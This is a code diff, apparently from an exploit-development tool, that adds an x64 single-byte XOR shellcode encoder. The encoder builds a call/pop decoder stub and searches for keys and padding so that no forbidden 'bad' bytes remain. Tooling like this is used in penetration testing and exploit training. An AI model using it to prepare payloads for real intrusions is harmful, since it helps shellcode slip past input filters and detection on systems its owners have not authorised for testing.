@@ -284,6 +284,242 @@ def _check_length_bytes(payload_len: int, badchars: set[int]) -> str | None:
     return None
 
 
+# -- x64 decoder stub ---------------------------------------------------
+#
+# Layout (call/pop, RIP-relative):
+#
+#   [pad]               optional neutral padding (shifts jmp disp)
+#   EB [jmp1]           jmp short call_tag
+#   5E                  pop rsi                 ; decoder:
+#   48 31 C9            xor rcx, rcx
+#   B1 [LEN]            mov cl, payload_len     (small, <= 255)
+#   -or- 66 B9 [lo][hi] mov cx, payload_len    (large, 256-65535)
+#   [pad]               optional neutral padding (shifts loop/call disps)
+#   80 36 [KEY]         xor byte [rsi], KEY     ; decode_loop:
+#   48 FF C6            inc rsi                 ; REX.W inc rsi (NOT 0x46)
+#   E2 [loop]           loop decode_loop        ; uses RCX in 64-bit mode
+#   EB 05               jmp short payload
+#   E8 [c0 c1 c2 c3]   call decoder            ; call_tag:
+#                       encoded payload starts here
+#
+# 0x46 is a REX prefix in x64, not inc esi. inc rsi must be 48 FF C6.
+
+
+def _build_stub_x64(
+    payload_len: int,
+    key: int,
+    badchars: set[int],
+    pre_pad: int = 0,
+    mid_pad: int = 0,
+    neutral: int = 0x90,
+) -> bytes | None:
+    """Build an x64 XOR decoder stub with call/pop RIP-relative pattern."""
+    small = payload_len <= 255
+
+    parts: list[int] = []
+
+    # -- pre-padding
+    parts.extend([neutral] * pre_pad)
+
+    # -- jmp short call_tag (placeholder displacement)
+    jmp1_idx = len(parts)
+    parts.extend([0xEB, 0x00])
+
+    # -- decoder: pop rsi (5E, same encoding in x64)
+    decoder_offset = len(parts)
+    parts.append(0x5E)
+
+    # -- xor rcx, rcx (REX.W 31 C9)
+    parts.extend([0x48, 0x31, 0xC9])
+
+    # -- mov cl/cx, payload_len
+    if small:
+        parts.extend([0xB1, payload_len & 0xFF])
+    else:
+        lo = payload_len & 0xFF
+        hi = (payload_len >> 8) & 0xFF
+        parts.extend([0x66, 0xB9, lo, hi])
+
+    # -- mid-padding
+    parts.extend([neutral] * mid_pad)
+
+    # -- decode_loop: xor byte [rsi], key
+    loop_target = len(parts)
+    parts.extend([0x80, 0x36, key])
+
+    # -- inc rsi (REX.W FF C6, NOT 0x46 which is a REX prefix in x64)
+    parts.extend([0x48, 0xFF, 0xC6])
+
+    # -- loop decode_loop (E2 uses RCX in 64-bit mode)
+    loop_instr = len(parts)
+    loop_disp = loop_target - (loop_instr + 2)
+    parts.extend([0xE2, loop_disp & 0xFF])
+
+    # -- jmp short payload (skip over the 5-byte call)
+    parts.extend([0xEB, 0x05])
+
+    # -- call_tag: call decoder
+    call_instr = len(parts)
+    call_next = call_instr + 5
+    call_disp = decoder_offset - call_next
+    call_bytes = call_disp & 0xFFFFFFFF
+    parts.append(0xE8)
+    parts.extend([(call_bytes >> (8 * i)) & 0xFF for i in range(4)])
+
+    # -- fix jmp1 displacement
+    jmp1_next = jmp1_idx + 2
+    jmp1_target = call_instr
+    jmp1_disp = jmp1_target - jmp1_next
+    parts[jmp1_idx + 1] = jmp1_disp & 0xFF
+
+    stub = bytes(parts)
+
+    for b in stub:
+        if b in badchars:
+            return None
+
+    return stub
+
+
+def _try_build_stub_x64(
+    payload_len: int,
+    key: int,
+    badchars: set[int],
+) -> bytes | None:
+    """Try multiple padding amounts to find a clean x64 stub."""
+    neutral = _pick_neutral(badchars)
+    if neutral is None:
+        return None
+
+    for pre in range(9):
+        for mid in range(9):
+            stub = _build_stub_x64(payload_len, key, badchars, pre, mid, neutral)
+            if stub is not None:
+                return stub
+
+    return None
+
+
+def xor_encode_x64(payload: bytes, badchars: set[int]) -> EncoderResult:
+    """Encode *payload* with single-byte XOR for x64 execution.
+
+    Same algorithm as xor_encode() but uses an x64-native decoder stub
+    (REX.W prefixes, RCX loop counter, inc rsi via 48 FF C6).
+    """
+    plen = len(payload)
+    if plen == 0:
+        return EncoderResult(
+            success=True,
+            strategy="xor8-x64",
+            encoded=b"",
+            key=None,
+            payload_size=0,
+            diagnostics="Empty payload - nothing to encode.",
+        )
+
+    if plen > 65535:
+        return EncoderResult(
+            success=False,
+            strategy="xor8-x64",
+            payload_size=plen,
+            diagnostics=f"Payload too large for XOR8 encoder ({plen} bytes, max 65535).",
+        )
+
+    neutral = _pick_neutral(badchars)
+    if neutral is None:
+        return EncoderResult(
+            success=False,
+            strategy="xor8-x64",
+            payload_size=plen,
+            diagnostics=(
+                "No neutral padding byte available - all NOP-like instructions "
+                "are forbidden. A more advanced encoder is needed."
+            ),
+        )
+
+    len_err = _check_length_bytes(plen, badchars)
+    if len_err:
+        return EncoderResult(
+            success=False,
+            strategy="xor8-x64",
+            payload_size=plen,
+            diagnostics=f"{len_err}\nPad the payload or use a different encoder.",
+        )
+
+    keys_tested = 0
+    payload_clean_keys = 0
+    stub_failure_detail: str | None = None
+
+    for key in range(1, 256):
+        if key in badchars:
+            continue
+        keys_tested += 1
+
+        encoded_body = bytes(b ^ key for b in payload)
+
+        if any(b in badchars for b in encoded_body):
+            continue
+
+        payload_clean_keys += 1
+
+        stub = _try_build_stub_x64(plen, key, badchars)
+        if stub is None:
+            if stub_failure_detail is None:
+                stub_failure_detail = (
+                    f"Key 0x{key:02x}: encoded payload clean, "
+                    f"but no valid x64 decoder stub found."
+                )
+            continue
+
+        full = stub + encoded_body
+
+        if any(b in badchars for b in full):
+            continue
+
+        diag_lines = [
+            "Encoding Strategy  XOR8-x64",
+            f"Forbidden          {' '.join(f'{b:02x}' for b in sorted(badchars))}",
+            f"Key                0x{key:02x}",
+            f"Payload            {plen} bytes",
+            f"Stub               {len(stub)} bytes",
+            f"Total              {len(full)} bytes",
+            f"Keys Tested        {keys_tested}",
+            f"Payload-Clean Keys {payload_clean_keys}",
+            "Result             SUCCESS",
+        ]
+        return EncoderResult(
+            success=True,
+            strategy="xor8-x64",
+            encoded=full,
+            key=key,
+            stub_size=len(stub),
+            payload_size=plen,
+            keys_tested=keys_tested,
+            payload_clean_keys=payload_clean_keys,
+            diagnostics="\n".join(diag_lines),
+        )
+
+    diag_lines = [
+        "Encoding Strategy  XOR8-x64",
+        f"Forbidden          {' '.join(f'{b:02x}' for b in sorted(badchars))}",
+        f"Payload            {plen} bytes",
+        f"Keys Tested        {keys_tested}",
+        f"Payload-Clean Keys {payload_clean_keys}",
+        "Result             FAILURE",
+    ]
+    if stub_failure_detail:
+        diag_lines.append("")
+        diag_lines.append(stub_failure_detail)
+    return EncoderResult(
+        success=False,
+        strategy="xor8-x64",
+        payload_size=plen,
+        keys_tested=keys_tested,
+        payload_clean_keys=payload_clean_keys,
+        diagnostics="\n".join(diag_lines),
+    )
+
+
 def xor_encode(payload: bytes, badchars: set[int]) -> EncoderResult:
     """Encode *payload* with single-byte XOR to eliminate *badchars*.
 
